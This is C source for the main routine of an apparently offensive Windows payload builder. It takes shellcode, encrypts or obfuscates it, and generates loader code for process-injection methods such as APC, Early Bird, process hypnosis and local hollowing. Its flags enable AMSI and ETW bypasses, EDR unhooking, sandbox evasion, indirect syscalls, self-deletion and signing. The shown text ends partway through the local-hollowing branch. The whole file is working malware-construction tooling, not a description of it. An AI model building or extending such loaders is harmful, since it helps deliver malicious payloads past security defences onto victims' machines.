#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "Common.h"
#include <stdlib.h> 
#include <io.h>

// array of supported output (supported input argv[2] encryption/obfuscation type)
CHAR* SupportedOutput[] = { "mac", "ipv4", "ipv6", "uuid", "aes", "rc4", "xor"};

// array of supported output (supported input argv[3] Injection type)
CHAR* SupportedOutput2[] = { "APC", "Early-Bird-Suspended", "Early-Bird-Debug", "EnumThreadWindows", "Local-Mapping-Inject", "Early-Cascade", "fibers", "process-hypnosis", "tp-alloc", "local-hollowing"};





int main(int argc, char* argv[]) 
{
	// data to help us in dealing with user's input
	DWORD	dwType = NULL;
	BOOL	bSupported = FALSE;
	BOOL	bSupported2 = FALSE;

	// variables used for holding data on the read payload 
	
	DWORD	dwPayloadSize = NULL;

	// just in case we needed to append out input payload:
	
	DWORD	dwAppendedSize = NULL;

	// variables used for holding data on the encrypted payload (aes/rc4)
	
	DWORD	dwCipherSize = NULL;


	// checking input
	if (argc == 2 && _stricmp(argv[1], "-h") == 0) {
		return PrintHelp(argv[0]);
	}

	if (argc <= 2) {
		return PrintHelp2(argv[0]);
	}

	if (argc <= 4) {
		return PrintHelp(argv[0]);
	}

	// Validate optional flags if any are present
	if (!ValidateOptionalFlags(argc, argv)) {
		return PrintHelp(argv[0]);
	}

	//compile flags
	char compileFlags[256] = "";

	//exec flags
	BOOL normal_apc = FALSE;
	BOOL normal_Early_Bird_Suspended = FALSE;
	BOOL normal_Early_Bird_Debug = FALSE;
	BOOL normal_EnumThreadWindows = FALSE;
	BOOL normal_Local_Mapping_Inject = FALSE;
	BOOL normal_Early_Cascade = FALSE;
	BOOL normal_fibers = FALSE;
	BOOL normal_hypnosis = FALSE;
	BOOL normal_tpalloc = FALSE;
	BOOL normal_local_hollowing = FALSE;


	// Check optional flags

		//amsi
	BOOL amsiFlag_opensession = CheckAndRemoveFlag(&argc, argv, "--amsi-opensession");
	BOOL amsiFlag_scanbuffer = CheckAndRemoveFlag(&argc, argv, "--amsi-scanbuffer");
	BOOL amsiFlag_signature = CheckAndRemoveFlag(&argc, argv, "--amsi-signature");
	BOOL amsiFlag_codetrust = CheckAndRemoveFlag(&argc, argv, "--amsi-codetrust");

		//unhooking	
	BOOL unhookingFlag_diskcreatefile = CheckAndRemoveFlag(&argc, argv, "--unhooking-createfile");
	BOOL unhookingFlag_knowndlls = CheckAndRemoveFlag(&argc, argv, "--unhooking-knowndlls");
	BOOL unhookingFlag_debug = CheckAndRemoveFlag(&argc, argv, "--unhooking-debug");
	BOOL unhookingFlag_hookchain = CheckAndRemoveFlag(&argc, argv, "--hookchain");

		//etw
	BOOL etwFlag_eventwrite = CheckAndRemoveFlag(&argc, argv, "--etw-eventwrite");
	BOOL etwFlag_TraceEvent = CheckAndRemoveFlag(&argc, argv, "--etw-trace-event");
	BOOL etwFlag_peventwritefull = CheckAndRemoveFlag(&argc, argv, "--etw-peventwritefull");

		//sandbox
	BOOL sandboxFlag_apihammering = CheckAndRemoveFlag(&argc, argv, "--api-hammering");
	BOOL sandboxFlag_mwfmoex = CheckAndRemoveFlag(&argc, argv, "--delay-mwfmoex");
	BOOL sandboxFlag_ntdelay = CheckAndRemoveFlag(&argc, argv, "--ntdelay");
	BOOL sandboxFlag_fibonacci = CheckAndRemoveFlag(&argc, argv, "--fibonacci");
	BOOL sandboxFlag_mouseclicks = CheckAndRemoveFlag(&argc, argv, "--mouse-clicks");
	BOOL sandboxFlag_resolution = CheckAndRemoveFlag(&argc, argv, "--resolution");
	BOOL sandboxFlag_processes = CheckAndRemoveFlag(&argc, argv, "--processes");
	BOOL sandboxFlag_hardware = CheckAndRemoveFlag(&argc, argv, "--hardware");

		//payload-control
	BOOL payloadFlag_control = CheckAndRemoveFlag(&argc, argv, "--check-running");
	BOOL payloadFlag_selfdelete = CheckAndRemoveFlag(&argc, argv, "--self-delete");

		//indirect syscalls
	BOOL indirectFlag_hellshall = CheckAndRemoveFlag(&argc, argv, "--hells-hall");
	BOOL indirectFlag_syswhispers = CheckAndRemoveFlag(&argc, argv, "--syswhispers");

		//compiler
	BOOL compilerFlag_llvm = CheckAndRemoveFlag(&argc, argv, "--llvm");
	


		//misc
	BOOL miscFlag_nowindow = CheckAndRemoveFlag(&argc, argv, "--no-window");
	BOOL miscFlag_printf = CheckAndRemoveFlag(&argc, argv, "--no-print");
	BOOL miscFlag_serviice = CheckAndRemoveFlag(&argc, argv, "--service");
	BOOL miscFlag_dll = FALSE;
	char* dllExportName = NULL;
	dllExportName = CheckAndRemoveFlagWithValue(&argc, argv, "--dll");
	if (dllExportName != NULL) {
		miscFlag_dll = TRUE;
	}
	else {
		// No value provided, check for regular --dll flag
		miscFlag_dll = CheckAndRemoveFlag(&argc, argv, "--dll");
	}

	BOOL miscFlag2_dll = FALSE;
	char* dllExportName2 = NULL;
	dllExportName2 = CheckAndRemoveFlagWithValue(&argc, argv, "--dll");
	if (dllExportName2 != NULL) {
		miscFlag2_dll = TRUE;
	}
	else {
		// No value provided, check for regular --dll flag
		miscFlag2_dll = CheckAndRemoveFlag(&argc, argv, "--dll-stealthy");
	}



	BOOL miscFlag_inflate = FALSE;
	int inflateCount = 0;
	char* inflateValue = CheckAndRemoveFlagWithValue(&argc, argv, "--inflate");
	if (inflateValue != NULL) {
		inflateCount = atoi(inflateValue);
		free(inflateValue);
		miscFlag_inflate = TRUE;
	}
	else {
		// Check if --inflate exists without a value
		for (int i = 1; i < argc; i++) {
			if (strcmp(argv[i], "--inflate") == 0) {
				printf("<<<!>>> Missing number for --inflate flag. <<<!>>>\n");
				return PrintHelp(argv[0]);
			}
		}
	}


		//sign
	char* signPfxFile = NULL;
	char* signPassword = NULL;
	for (int i = 1; i < argc; i++) {
		if (strcmp(argv[i], "--sign") == 0) {
			if (i + 1 < argc) {
				signPfxFile = argv[i + 1];
				i++;  // Skip the file parameter

				// Check if the next parameter might be a password (not another flag)
				if (i + 1 < argc && argv[i + 1][0] != '-') {
					signPassword = argv[i + 1];
					i++;  // Skip the password parameter
				}
			}
			else {
				printf("<<<!>>> Missing PFX file for --sign flag. <<<!>>>\n");
				return PrintHelp(argv[0]);
			}
		}
	}
			//decoy

	char* miscFlag_decoyFile = CheckAndRemoveFlagWithValue(&argc, argv, "--decoy");

	



	// Validate generator type (argv[1])
	if (_stricmp(argv[1], "donut") != 0 &&
		_stricmp(argv[1], "clematis") != 0 &&
		_stricmp(argv[1], "powershell-donut") != 0 &&
		_stricmp(argv[1], "raw") != 0) {
		printf("\n<<<!>>> Invalid generator type: %s <<<!>>>\n", argv[1]);
		return PrintHelp2(argv[0]);
	}
	

	// Validate encryption type (argv[3])
	BOOL bEncValid = FALSE;
	for (int i = 0; i < 7; i++) {
		if (_stricmp(argv[3], SupportedOutput[i]) == 0) {
			bEncValid = TRUE;
			break;
		}
	}

	if (!bEncValid) {
		printf("\n<<<!>>> Invalid encryption/obfuscation type: %s <<<!>>>\n", argv[3]);
		return PrintHelp(argv[0]);
	}

	// Validate injection type (argv[4])
	BOOL bInjValid = FALSE;
	for (int i = 0; i < 10; i++) {
		if (_stricmp(argv[4], SupportedOutput2[i]) == 0) {
			bInjValid = TRUE;
			break;
		}
	}

	if (!bInjValid) {
		printf("\n<<<!>>> Invalid injection type: %s <<<!>>>\n", argv[4]);
		return PrintHelp(argv[0]);
	}

	//Delete things inside output folder
	RemoveAllFilesInOutputFolder();
	RemoveAllFilesInErwinFolder();


	if (_stricmp(argv[1], "donut") == 0) {
		// Shift arguments to the left by one position
		for (int i = 1; i < argc - 1; i++) {
			argv[i] = argv[i + 1];
		}
		argc--;

		// Run donut with the provided arguments
		donut(argc, argv);

		// Read the generated Erwin.bin file
		if (!ReadPayloadFile("output\\code\\Erwin.bin", &dwPayloadSize, &pPayloadInput)) {
			return -1;
		}
	}
	else if (_stricmp(argv[1], "clematis") == 0) {
		// Shift arguments to the left by one position
		for (int i = 1; i < argc - 1; i++) {
			argv[i] = argv[i + 1];
		}
		argc--;

		// Run Clematis with the provided arguments
		clematis(argc, argv);

		// Read the generated Erwin.bin file
		if (!ReadPayloadFile("output\\code\\Erwin.bin", &dwPayloadSize, &pPayloadInput)) {
			return -1;
		}
	}
	else if (_stricmp(argv[1], "powershell-donut") == 0) {
		// Shift arguments to the left by one position
		for (int i = 1; i < argc - 1; i++) {
			argv[i] = argv[i + 1];
		}
		argc--;

		// Run Clematis with the provided arguments
		powershell_donut(argc, argv);

		// Read the generated Erwin.bin file
		if (!ReadPayloadFile("output\\code\\Erwin.bin", &dwPayloadSize, &pPayloadInput)) {
			return -1;
		}
	}
	else if (_stricmp(argv[1], "raw") == 0) {
		// Shift arguments to the left by one position
		for (int i = 1; i < argc - 1; i++) {
			argv[i] = argv[i + 1];
		}
		argc--;
		
		// Check if the file is an EXE by examining the extension
		char* extension = strrchr(argv[1], '.');
		if (extension && _stricmp(extension, ".exe") == 0) {
			if (!ReadPayloadFile2(argv[1], &dwPayloadSize, &pPayloadInput)) {
				return -1;
			}
		}
		else {
			// Read the file using the standard method
			if (!ReadPayloadFile(argv[1], &dwPayloadSize, &pPayloadInput)) {
				return -1;
			}
		}

	}
	else {
		printf("<<<!>>> \"%s\" Is not Valid Input <<<!>>>\n", argv[1]);
		return PrintHelp(argv[0]);
	}
	
	
	// intialize the possible append variables, since later we will deal with these only to print (*GenerateXXXOutput* functions)
	pAppendedPayload = pPayloadInput;
	dwAppendedSize = dwPayloadSize;


	


	//Obfuscation Type or Encryption Type

	RedirectStdoutToFile("output\\code\\enc.c");

	if (_stricmp(argv[2], "mac") == 0) {

		Headers("mac");

		if (dwPayloadSize % 6 != 0) {
			if (!AppendInputPayload(6, pPayloadInput, dwPayloadSize, &pAppendedPayload, &dwAppendedSize)) {
				return -1;
			}
		}

		if (!GenerateMacOutput(pAppendedPayload, dwAppendedSize))
		{
			return -1;
		}

		//wType = MACFUSCATION;
		PrintDecodeFunctionality(MACFUSCATION);

		FreeAllocatedMemory();
	}

	if (_stricmp(argv[2], "ipv4") == 0) {


		Headers("ipv4");

		if (dwPayloadSize % 4 != 0) {
			if (!AppendInputPayload(4, pPayloadInput, dwPayloadSize, &pAppendedPayload, &dwAppendedSize)) {
				return -1;
			}
		}

		// generate array of ipv4 addresses from new appended shellcode 
		if (!GenerateIpv4Output(pAppendedPayload, dwAppendedSize)) {
			return -1;
		}

		PrintDecodeFunctionality(IPV4FUSCATION);



		FreeAllocatedMemory();
	}

	if (_stricmp(argv[2], "ipv6") == 0) {
		// if payload isnt multiple of 16 we padd it

	
		Headers("ipv6");

		if (dwPayloadSize % 16 != 0) {
			if (!AppendInputPayload(16, pPayloadInput, dwPayloadSize, &pAppendedPayload, &dwAppendedSize)) {
				return -1;
			}
		}

		// generate array of ipv6 addresses from new appended shellcode 
		if (!GenerateIpv6Output(pAppendedPayload, dwAppendedSize)) {
			return -1;
		}


		PrintDecodeFunctionality(IPV6FUSCATION);


		FreeAllocatedMemory();
	}

	if (_stricmp(argv[2], "uuid") == 0) {
		// If payload isn't multiple of 16 we pad it

		Headers("uuid");

		//Typedefs for Enc
		//createfile_outputfolder("typedef_enc.h");
		//copyFileContents_evasionFolder("api_hashing", "typedef_enc.h");



		if (dwPayloadSize % 16 != 0) {
			if (!AppendInputPayload(16, pPayloadInput, dwPayloadSize, &pAppendedPayload, &dwAppendedSize)) {
				return -1;
			}
		}


		// Generate array of uuid addresses from new appended shellcode
		if (!GenerateUuidOutput(pAppendedPayload, dwAppendedSize)) {
			return -1;
		}


		PrintDecodeFunctionality(UUIDFUSCATION);


		FreeAllocatedMemory();
	}

	if (_stricmp(argv[2], "aes") == 0) {


		//Typedefs for Enc
		//createfile_outputfolder("typedef_enc.h");
		//copyFileContents_evasionFolder("api_hashing", "typedef_enc.h");


		CHAR	KEY[AESKEYSIZE], KEY2[AESKEYSIZE];
		CHAR	IV[AESIVSIZE], IV2[AESIVSIZE];

		srand(time(NULL));
		GenerateRandomBytes(KEY, AESKEYSIZE);
		srand(time(NULL) ^ KEY[0]);
		GenerateRandomBytes(IV, AESIVSIZE);

		//saving the key and iv in case it got modified by the encryption algorithm
		memcpy(KEY2, KEY, AESKEYSIZE);
		memcpy(IV2, IV, AESIVSIZE);

		//RedirectStdoutToFile("Founding.c");

		Headers("aes");

		if (!SimpleEncryption(pPayloadInput, dwPayloadSize, KEY, IV, &pCipherText, &dwCipherSize)) {
			return -1;
		}


		PrintHexData("AesCipherText", pCipherText, dwCipherSize);
		PrintHexData("AesKey", KEY2, AESKEYSIZE);
		PrintHexData("AesIv", IV2, AESIVSIZE);

		//Terminal Output to a file
		//RedirectStdoutToFile("AES.c");

		PrintDecodeFunctionality(AESENCRYPTION);


		FreeAllocatedMemory();
	}

	if (_stricmp(argv[2], "rc4") == 0) {


		//Typedefs for Enc
		//createfile_outputfolder("typedef_enc.h");
		//copyFileContents_evasionFolder("api_hashing", "typedef_enc.h");


		CHAR	KEY[RC4KEYSIZE], KEY2[RC4KEYSIZE];

		srand(time(NULL));
		GenerateRandomBytes(KEY, RC4KEYSIZE);

		//saving the key in case it got modified by the encryption algorithm
		memcpy(KEY2, KEY, RC4KEYSIZE);


		Headers("rc4");

		if (!Rc4EncryptionViSystemFunc032(KEY, pPayloadInput, RC4KEYSIZE, dwPayloadSize)) {
			return -1;
		}

		PrintHexData("Rc4CipherText", pPayloadInput, dwPayloadSize);
		PrintHexData("Rc4Key", KEY2, RC4KEYSIZE);

		//Terminal Output to a file
		//RedirectStdoutToFile("RC4.c");

		PrintDecodeFunctionality(RC4ENCRYPTION);

		FreeAllocatedMemory();
	}

	if (_stricmp(argv[2], "xor") == 0) {

		CHAR	KEY[XORKEYSIZE], KEY2[XORKEYSIZE];

		srand(time(NULL));
		GenerateRandomBytes(KEY, XORKEYSIZE);

		//saving the key in case it got modified by the encryption algorithm
		memcpy(KEY2, KEY, XORKEYSIZE);


		//RedirectStdoutToFile("Founding.c");

		Headers("xor");

		//XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize)
		if (!XorByInputKey(pPayloadInput, dwPayloadSize, KEY, XORKEYSIZE)) {
			return -1;
		}

		PrintHexData("XORCipherText", pPayloadInput, dwPayloadSize);
		PrintHexData("XORKey", KEY2, RC4KEYSIZE);


		//Print on Terminal
		PrintDecodeFunctionality(XORENCRYPTION);


		FreeAllocatedMemory();
	}


	freopen("CON", "w", stdout);
	

	//Execution Type

	

	if (_stricmp(argv[3], "APC") == 0)
	{
		//compile things
		normal_apc = TRUE;
		if (normal_apc) {
			
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "normal-apc"); 
		}

		//create apc.c
		createfile_outputfolder("apc.c");
		copyFileContents_executionFolder_filename("apc", "apc.c");

		//create exec.h
		createfile_outputfolder("exec.h");
		copyFileContents_executionFolder_filename("start_function", "exec.h");

		//create _start.c
		createfile_outputfolder("start.c");
		copyFileContents_executionFolder_filename("start_function", "start.c");

		//create exec.c
		createfile_outputfolder("exec.c");
		copyFileContents_executionFolder_filename("start_function", "exec.c");

		//create enc.h
		createfile_enc_header();
		copyFileContents_enc_header("enc");

		//create api hash files
		createfile_outputfolder("typedef.h");
		createfile_outputfolder("typedef.c");
		createfile_outputfolder("api_hashing.h");
		createfile_outputfolder("api_hashing.cpp");

		//copy api hash files contents
		copyFileContents_evasionFolder("api_hashing", "typedef.h");
		copyFileContents_evasionFolder("api_hashing", "typedef.c");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.h");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.cpp");

		//create iat camu files
		createfile_outputfolder("iat_camuflage.c");
		createfile_outputfolder("iat_camuflage.h");

		//copy iat files contents
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.c");
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.h");

		//execute function
		getfilecontentcomment("apc();", "output\\code\\exec.c", "//exec");
	





	}

	if (_stricmp(argv[3], "Early-Bird-Suspended") == 0)
	{

		//compile things
		normal_Early_Bird_Suspended = TRUE;
		if (normal_Early_Bird_Suspended) {

			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "normal-earlybird-suspended");
		}

		//create apc.c
		createfile_outputfolder("early_bird_suspended.c");
		copyFileContents_executionFolder_filename("early_bird_suspended", "early_bird_suspended.c");

		//create exec.h
		createfile_outputfolder("exec.h");
		copyFileContents_executionFolder_filename("start_function", "exec.h");

		//create _start.c
		createfile_outputfolder("start.c");
		copyFileContents_executionFolder_filename("start_function", "start.c");

		//create exec.c
		createfile_outputfolder("exec.c");
		copyFileContents_executionFolder_filename("start_function", "exec.c");

		//create enc.h
		createfile_enc_header();
		copyFileContents_enc_header("enc");

		//create api hash files
		createfile_outputfolder("typedef.h");
		createfile_outputfolder("typedef.c");
		createfile_outputfolder("api_hashing.h");
		createfile_outputfolder("api_hashing.cpp");

		//copy api hash files contents
		copyFileContents_evasionFolder("api_hashing", "typedef.h");
		copyFileContents_evasionFolder("api_hashing", "typedef.c");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.h");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.cpp");

		//create iat camu files
		createfile_outputfolder("iat_camuflage.c");
		createfile_outputfolder("iat_camuflage.h");

		//copy apihash files contents
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.c");
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.h");

		//execute function
		getfilecontentcomment("earlyB_suspended();", "output\\code\\exec.c", "//exec");

		//put early_bird_debug.c inside exec.c
		//copyFileContents_executionFolder("early_bird_debug","early_bird_debug");
		

	}

	if (_stricmp(argv[3], "Early-Bird-Debug") == 0)
	{

		//compile things
		normal_Early_Bird_Debug = TRUE;
		if (normal_Early_Bird_Debug) {

			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "normal-earlybird-debug");
		}

		//create 
		createfile_outputfolder("early_bird_debug.c");
		copyFileContents_executionFolder_filename("early_bird_debug", "early_bird_debug.c");

		//create exec.h
		createfile_outputfolder("exec.h");
		copyFileContents_executionFolder_filename("start_function", "exec.h");

		//create _start.c
		createfile_outputfolder("start.c");
		copyFileContents_executionFolder_filename("start_function", "start.c");

		//create exec.c
		createfile_outputfolder("exec.c");
		copyFileContents_executionFolder_filename("start_function", "exec.c");

		//create enc.h
		createfile_enc_header();
		copyFileContents_enc_header("enc");

		//create api hash files
		createfile_outputfolder("typedef.h");
		createfile_outputfolder("typedef.c");
		createfile_outputfolder("api_hashing.h");
		createfile_outputfolder("api_hashing.cpp");

		//copy api hash files contents
		copyFileContents_evasionFolder("api_hashing", "typedef.h");
		copyFileContents_evasionFolder("api_hashing", "typedef.c");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.h");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.cpp");

		//create iat camu files
		createfile_outputfolder("iat_camuflage.c");
		createfile_outputfolder("iat_camuflage.h");

		//copy apihash files contents
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.c");
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.h");


		//execute function
		getfilecontentcomment("earlyB_debug();", "output\\code\\exec.c", "//exec");


	}

	if (_stricmp(argv[3], "EnumThreadWindows") == 0)
	{
		//compile things
		normal_EnumThreadWindows = TRUE;
		if (normal_EnumThreadWindows) {

			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "normal-enumthreadwindows");
		}

		//create callback_enumthreadwindows.c
		createfile_outputfolder("callback_enumthreadwindows.c");
		copyFileContents_executionFolder_filename("callback_enumthreadwindows", "callback_enumthreadwindows.c");

		//create exec.h
		createfile_outputfolder("exec.h");
		copyFileContents_executionFolder_filename("start_function", "exec.h");
		
		//create _start.c
		createfile_outputfolder("start.c");
		copyFileContents_executionFolder_filename("start_function", "start.c");

		//create exec.c
		createfile_outputfolder("exec.c");
		copyFileContents_executionFolder_filename("start_function", "exec.c");

		//put enc.h inside enc.h
		createfile_enc_header();
		copyFileContents_enc_header("enc");

		//create api hash files
		createfile_outputfolder("typedef.h");
		createfile_outputfolder("typedef.c");
		createfile_outputfolder("api_hashing.h");
		createfile_outputfolder("api_hashing.cpp");

		//copy api hash files contents
		copyFileContents_evasionFolder("api_hashing", "typedef.h");
		copyFileContents_evasionFolder("api_hashing", "typedef.c");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.h");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.cpp");


		//create iat camu files
		createfile_outputfolder("iat_camuflage.c");
		createfile_outputfolder("iat_camuflage.h");

		//copy apihash files contents
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.c");
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.h");

		//execute function
		getfilecontentcomment("callback_enumthreadwindows();", "output\\code\\exec.c", "//exec");
	}

	if (_stricmp(argv[3], "Local-Mapping-Inject") == 0)
	{
		//compile things
		normal_Local_Mapping_Inject = TRUE;
		if (normal_Local_Mapping_Inject) {

			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "normal-localmapping");
		}

		//create local_mapping.c
		createfile_outputfolder("local_mapping.c");
		copyFileContents_executionFolder_filename("local_mapping", "local_mapping.c");

		//create exec.h
		createfile_outputfolder("exec.h");
		copyFileContents_executionFolder_filename("start_function", "exec.h");

		//create _start.c
		createfile_outputfolder("start.c");
		copyFileContents_executionFolder_filename("start_function", "start.c");

		//create exec.c
		createfile_outputfolder("exec.c");
		copyFileContents_executionFolder_filename("start_function", "exec.c");

		//put enc.h inside enc.h
		createfile_enc_header();
		copyFileContents_enc_header("enc");

		//create api hash files
		createfile_outputfolder("typedef.h");
		createfile_outputfolder("typedef.c");
		createfile_outputfolder("api_hashing.h");
		createfile_outputfolder("api_hashing.cpp");

		//copy api hash files contents
		copyFileContents_evasionFolder("api_hashing", "typedef.h");
		copyFileContents_evasionFolder("api_hashing", "typedef.c");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.h");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.cpp");
		
		//create iat camu files
		createfile_outputfolder("iat_camuflage.c");
		createfile_outputfolder("iat_camuflage.h");

		//copy apihash files contents
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.c");
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.h");

		//execute function
		getfilecontentcomment("local_mapping();", "output\\code\\exec.c", "//exec");
		

	}

	if (_stricmp(argv[3], "Early-Cascade") == 0)
	{
		//compile things
		normal_Early_Cascade = TRUE;
		if (normal_Early_Cascade) {

			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "normal-earlycascade");
		}

		//create local_mapping.c
		createfile_outputfolder("earlycascade.c");
		copyFileContents_executionFolder_filename("early_cascade", "earlycascade.c");

		//create exec.h
		createfile_outputfolder("exec.h");
		copyFileContents_executionFolder_filename("start_function", "exec.h");

		//create _start.c
		createfile_outputfolder("start.c");
		copyFileContents_executionFolder_filename("start_function", "start.c");

		//create exec.c
		createfile_outputfolder("exec.c");
		copyFileContents_executionFolder_filename("start_function", "exec.c");

		//put enc.h inside enc.h
		createfile_enc_header();
		copyFileContents_enc_header("enc");

		//create api hash files
		createfile_outputfolder("typedef.h");
		createfile_outputfolder("typedef.c");
		createfile_outputfolder("api_hashing.h");
		createfile_outputfolder("api_hashing.cpp");

		//copy api hash files contents
		copyFileContents_evasionFolder("api_hashing", "typedef.h");
		copyFileContents_evasionFolder("api_hashing", "typedef.c");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.h");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.cpp");

		//create iat camu files
		createfile_outputfolder("iat_camuflage.c");
		createfile_outputfolder("iat_camuflage.h");

		//copy apihash files contents
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.c");
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.h");

		copyFileExecutionFromFolder("early_cascade", "stub.obj");

		//execute function
		getfilecontentcomment("Cascade();", "output\\code\\exec.c", "//exec");


	}

	if (_stricmp(argv[3], "fibers") == 0)
	{
		//compile things
		normal_fibers = TRUE;
		if (normal_fibers) {

			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "normal-fibers");
		}

		//create local_mapping.c
		createfile_outputfolder("fibers.c");
		copyFileContents_executionFolder_filename("fibers", "fibers.c");

		//create exec.h
		createfile_outputfolder("exec.h");
		copyFileContents_executionFolder_filename("start_function", "exec.h");

		//create _start.c
		createfile_outputfolder("start.c");
		copyFileContents_executionFolder_filename("start_function", "start.c");

		//create exec.c
		createfile_outputfolder("exec.c");
		copyFileContents_executionFolder_filename("start_function", "exec.c");

		//put enc.h inside enc.h
		createfile_enc_header();
		copyFileContents_enc_header("enc");

		//create api hash files
		createfile_outputfolder("typedef.h");
		createfile_outputfolder("typedef.c");
		createfile_outputfolder("api_hashing.h");
		createfile_outputfolder("api_hashing.cpp");

		//copy api hash files contents
		copyFileContents_evasionFolder("api_hashing", "typedef.h");
		copyFileContents_evasionFolder("api_hashing", "typedef.c");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.h");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.cpp");

		//create iat camu files
		createfile_outputfolder("iat_camuflage.c");
		createfile_outputfolder("iat_camuflage.h");

		//copy apihash files contents
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.c");
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.h");

		//execute function
		getfilecontentcomment("fibers();", "output\\code\\exec.c", "//exec");


	}

	if (_stricmp(argv[3], "process-hypnosis") == 0)
	{

		//compile things
		normal_hypnosis = TRUE;
		if (normal_hypnosis) {

			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "normal-hypnosis");
		}

		//create local_mapping.c
		createfile_outputfolder("process_hypnosis.c");
		copyFileContents_executionFolder_filename("process_hypnosis", "process_hypnosis.c");

		//create exec.h
		createfile_outputfolder("exec.h");
		copyFileContents_executionFolder_filename("start_function", "exec.h");

		//create _start.c
		createfile_outputfolder("start.c");
		copyFileContents_executionFolder_filename("start_function", "start.c");

		//create exec.c
		createfile_outputfolder("exec.c");
		copyFileContents_executionFolder_filename("start_function", "exec.c");

		//put enc.h inside enc.h
		createfile_enc_header();
		copyFileContents_enc_header("enc");

		//create api hash files
		createfile_outputfolder("typedef.h");
		createfile_outputfolder("typedef.c");
		createfile_outputfolder("api_hashing.h");
		createfile_outputfolder("api_hashing.cpp");

		//copy api hash files contents
		copyFileContents_evasionFolder("api_hashing", "typedef.h");
		copyFileContents_evasionFolder("api_hashing", "typedef.c");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.h");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.cpp");

		//create iat camu files
		createfile_outputfolder("iat_camuflage.c");
		createfile_outputfolder("iat_camuflage.h");

		//copy apihash files contents
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.c");
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.h");

		//execute function
		getfilecontentcomment("hypnosis();", "output\\code\\exec.c", "//exec");

	}


	if (_stricmp(argv[3], "tp-alloc") == 0)
	{

		//compile things
		normal_tpalloc = TRUE;
		if (normal_tpalloc) {

			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "normal-tpalloc");
		}

		//create local_mapping.c
		createfile_outputfolder("tpallocinject.c");
		copyFileContents_executionFolder_filename("tpallocinject", "tpallocinject.c");

		//create exec.h
		createfile_outputfolder("exec.h");
		copyFileContents_executionFolder_filename("start_function", "exec.h");

		//create _start.c
		createfile_outputfolder("start.c");
		copyFileContents_executionFolder_filename("start_function", "start.c");

		//create exec.c
		createfile_outputfolder("exec.c");
		copyFileContents_executionFolder_filename("start_function", "exec.c");

		//put enc.h inside enc.h
		createfile_enc_header();
		copyFileContents_enc_header("enc");

		//create api hash files
		createfile_outputfolder("typedef.h");
		createfile_outputfolder("typedef.c");
		createfile_outputfolder("api_hashing.h");
		createfile_outputfolder("api_hashing.cpp");

		//copy api hash files contents
		copyFileContents_evasionFolder("api_hashing", "typedef.h");
		copyFileContents_evasionFolder("api_hashing", "typedef.c");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.h");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.cpp");

		//create iat camu files
		createfile_outputfolder("iat_camuflage.c");
		createfile_outputfolder("iat_camuflage.h");

		//copy apihash files contents
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.c");
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.h");

		//execute function
		getfilecontentcomment("tpalloc();", "output\\code\\exec.c", "//exec");

	}

	if (_stricmp(argv[3], "local-hollowing") == 0)
	{

		//compile things
		normal_local_hollowing = TRUE;
		if (normal_local_hollowing) {

			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "normal-local-hollowing");
		}

		//create local_mapping.c
		createfile_outputfolder("local_hollowing.c");
		copyFileContents_executionFolder_filename("local_hollowing", "local_hollowing.c");

		//create exec.h
		createfile_outputfolder("exec.h");
		copyFileContents_executionFolder_filename("start_function", "exec.h");

		//create _start.c
		createfile_outputfolder("start.c");
		copyFileContents_executionFolder_filename("start_function", "start.c");

		//create exec.c
		createfile_outputfolder("exec.c");
		copyFileContents_executionFolder_filename("start_function", "exec.c");

		//put enc.h inside enc.h
		createfile_enc_header();
		copyFileContents_enc_header("enc");

		//create api hash files
		createfile_outputfolder("typedef.h");
		createfile_outputfolder("typedef.c");
		createfile_outputfolder("api_hashing.h");
